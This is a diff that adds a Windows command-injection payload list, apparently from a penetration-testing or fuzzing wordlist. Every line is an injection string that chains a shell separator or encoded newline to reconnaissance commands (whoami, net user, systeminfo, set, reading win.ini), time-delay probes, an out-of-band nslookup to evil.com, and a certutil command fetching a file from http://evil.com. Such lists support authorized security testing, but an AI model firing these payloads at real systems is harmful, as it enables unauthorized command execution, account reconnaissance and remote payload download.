@@ -1,0 +1,42 @@
+# Windows Command Injection Payloads
+& whoami
+&& whoami
+| whoami
+|| whoami
+; whoami
+& dir
+&& dir
+| dir
+|| dir
+& type C:\Windows\win.ini
+&& type C:\Windows\win.ini
+| type C:\Windows\win.ini
+& ipconfig
+&& ipconfig
+| ipconfig
+& net user
+&& net user
+| net user
+& systeminfo
+&& systeminfo
+| systeminfo
+%0awhoami
+%0dwhoami
+%0a%0dwhoami
+& ping -n 5 127.0.0.1
+| ping -n 5 127.0.0.1
+&& ping -n 5 127.0.0.1
+& timeout /t 5 /nobreak
+&& timeout /t 5 /nobreak
+& nslookup evil.com
+&& nslookup evil.com
+& certutil -urlcache -split -f http://evil.com/x x
+& powershell -c "whoami"
+& cmd /c whoami
+| cmd /c dir
+& set
+| set
+& echo %USERNAME%
+| echo %USERNAME%
+& echo %COMPUTERNAME%
+| echo %COMPUTERNAME%
